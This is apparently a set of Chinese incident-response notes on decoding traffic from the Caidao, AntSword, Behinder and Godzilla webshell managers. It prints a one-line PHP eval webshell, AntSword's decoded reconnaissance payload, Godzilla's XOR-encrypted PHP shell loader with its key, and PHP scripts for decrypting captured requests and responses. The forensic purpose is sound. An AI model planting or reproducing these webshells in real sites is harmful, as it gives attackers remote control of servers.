# 应急之webshell管理器的流量分析（菜刀蚁剑哥斯拉冰蝎）

## 菜刀

服务端用一句话木马`<?php eval($_POST['pass']);?>`

客户端发送初始化代码让服务端执行

## 蚁剑

服务端用一句话木马`<?php eval($_POST['pass']);?>`

除pass键，其他键的值前两位是随机字符填充，去掉base64解码就行

pass键类似

```
<?php
@ini_set("display_errors", "0");
@set_time_limit(0);

$opdir = @ini_get("open_basedir");
if ($opdir) {
    $ocwd = dirname($_SERVER["SCRIPT_FILENAME"]);
    $oparr = preg_split(base64_decode("Lzt8Oi8="), $opdir);
    @array_push($oparr, $ocwd, sys_get_temp_dir());

    foreach ($oparr as $item) {
        if (!@is_writable($item)) {
            continue;
        }
        $tmdir = $item . "/.aaced4f8c5";
        @mkdir($tmdir);
        if (!@file_exists($tmdir)) {
            continue;
        }
        $tmdir = realpath($tmdir);
        @chdir($tmdir);
        @ini_set("open_basedir", "..");
        $cntarr = @preg_split("/\\\\|\//", $tmdir);
        for ($i = 0; $i < sizeof($cntarr); $i++) {
            @chdir("..");
        }
        @ini_set("open_basedir", "/");
        @rmdir($tmdir);
        break;
    }
}

function asenc($out)
{
    return $out;
}

function asoutput()
{
    $output = ob_get_contents();
    ob_end_clean();
    echo "92094" . "739f87";
    echo @asenc($output);
    echo "294" . "3dd1";
}

ob_start();
try {
    $D = dirname($_SERVER["SCRIPT_FILENAME"]);
    if ($D == "") {
        $D = dirname($_SERVER["PATH_TRANSLATED"]);
    }
    $R = "{$D}	";
    if (substr($D, 0, 1) != "/") {
        foreach (range("C", "Z") as $L) {
            if (is_dir("{$L}:")) {
                $R .= "{$L}:";
            }
        }
    } else {
        $R .= "/";
    }
    $R .= "	";
    $u = (function_exists("posix_getegid")) ? @posix_getpwuid(@posix_geteuid()) : "";
    $s = ($u) ? $u["name"] : @get_current_user();
    $R .= php_uname();
    $R .= "	{$s}";
    echo $R;
} catch (Exception $e) {
    echo "ERROR://" . $e->getMessage();
}
asoutput();
die();
```

## 冰蝎

自带解密可以用

![image-20260301152938630](C:\Users\tiand\AppData\Roaming\Typora\typora-user-images\image-20260301152938630.png)

返回解密后类似

```
{"status":"c3VjY2Vzcw==","msg":"MS5odG1sCjIuaHRtbAozLmh0bWwKZHZ3YQpnaXRfCmluZGV4Lmh0bWwKaW5kZXgubmdpbngtZGViaWFuLmh0bWwKbXVtYS5waHAKcmEKc2NyaXB0LnBocApzaGVsbC5waHAKdGV4dAo="}-r"r6~!/&j$oeZ:d+e 7i~(rk1.jrdi3Me/G:Oy7D$4>|g<lfqGDc!h6R:G=jyKd=965]#e3gT7%4=5v5d3(^Pe7[%=965]#fPx_e'7M4ggbHu7T`>i4K$&eP4Oe'7M3Mh`i1tq
```

base64解码就行

## 哥斯拉

以php_xor_base64为例

初始化三次请求

之后的响应包前16个字节和最后的16个字节和第二响应包都是一致的，都是填充

pass是执行

```
@session_start();
@set_time_limit(0);
@error_reporting(0);
function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='key';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
if (isset($_POST[$pass])){
    $data=encode(base64_decode($_POST[$pass]),$key);
    if (isset($_SESSION[$payloadName])){
        $payload=encode($_SESSION[$payloadName],$key);
        if (strpos($payload,"getBasicsInfo")===false){
            $payload=encode($payload,$key);
        }
		eval($payload);
        echo substr(md5($pass.$key),0,16);
        echo base64_encode(encode(@run($data),$key));
        echo substr(md5($pass.$key),16);
    }else{
        if (strpos($data,"getBasicsInfo")!==false){
            $_SESSION[$payloadName]=encode($data,$key);
        }
    }
}
```

对key字段解密

```
<?php function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='key';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
$content='DlMRWA1cL1gOVDc2MjRhRwZFEQ%3D%3D';
$data=encode(base64_decode(urldecode($content)),$key);
echo $data;
```

对响应体（有一个gzip压缩）解密

```
<?php function encode($D,$K){
    for($i=0;$i<strlen($D);$i++) {
        $c = $K[$i+1&15];
        $D[$i] = $D[$i]^$c;
    }
    return $D;
}
$pass='key';
$payloadName='payload';
$key='3c6e0b8a9c15224a';
$content='72a9c691ccdaab98fL1tMGI4YTljMkBmb1vCC3dLgmdC1aq1h02llqtAv5EjQPWq4Bi8pP4m/rep1MwMO1o/4j2HtnnBZ+9PcuyGbzzpHkyO/KXTx8zazDFjDNTcBqTNl8wPA/yJ1EDwUNhtmolgThxwnA3ok3ZIltU+vLh12cMhQId1lsDee9IiZc308xmB/jyS8J/Pnu1f4hWOkUAI4+KKLj957Zzj6E44Ryu4dO3kWedpE46tNNk5H+CDfMB5FHwLKB9qm44t8wJ5HOQYop+BrPtLRRYWNUiWIyS5IirFNqiaj74dyZ3w6v728o+TnR2mRFRCmta0CWqTxGBwpgldPcfHN3Ctq7XziAUKrhXeU2QBHQvbDmKxT+5H+Pb5BEsWBmrfCdoeHOIqi4YN5vheR8GQnZvYK97UqbwZM67bIGqLfXKZnlUqNrYLfcUF0S3j6ozMf2GDMr1pTHoTf2XvGq9Hn93rGV8HXAxZ1voo2cQGMata4So9N4DBtCD1NhHB0HrdAL2hc7bZFwM4xTq0yMubpiZV0ZHsHaOuCGPahdrMc6PRZYFMZGBYEKHfjYRvWA8Kzbp03ucpr9JhYC4CYQqGYKv107lR35bgAu+kbf4Io027Lgn1gSB0xuS05Jtu5lx3DZdoEElk/4yVgeqRYp5rSyeWXBo1Q6qbTkfTARlUTgUem1Zp3vUDeAL34W8KWhhJsQLk+cGwwUNTkawq6fYYqZ6Ih2MJvsW0dlvnnScuTAEliIc3RhwEaGsbTU1eY02nQu2c+q2gnieIL+/k1waw6Dd93VqCTHoYhmetbWwc3kj7i0STehNGhSVgt3Zrm7L08zpgIymPQH7Vd2k1yKHK+ep0GebBTTmkaX5gQpqqX0wVkfzwOZc6ZXeTKeYry7pRcWz+CyOmRzt20pQTeZPtwJGCpS4q8qfmlCO71wKOUEFJtvr9t9c/pFZo6e1yZwvEf3b73kAuREPMWV0cSGdiszLzCeZhGGZhJXxHTSxLTVo0DT1sC5zTFx2fPJ1YzhwyR8plpjnOYTzqgBMt2xWg2ZjTfLxv5pqzUMsrYtnvX2Lc9GATfYaP2un35jnuoLn8+D8C2GVnbYh6oJPBar7ozNy43IWWP7x1IkidOhA+3v25NzI0b4c4e1f6ddd2a488';


$data=encode(base64_decode(substr($content,16,-16)),$key);

echo gzdecode($data);
```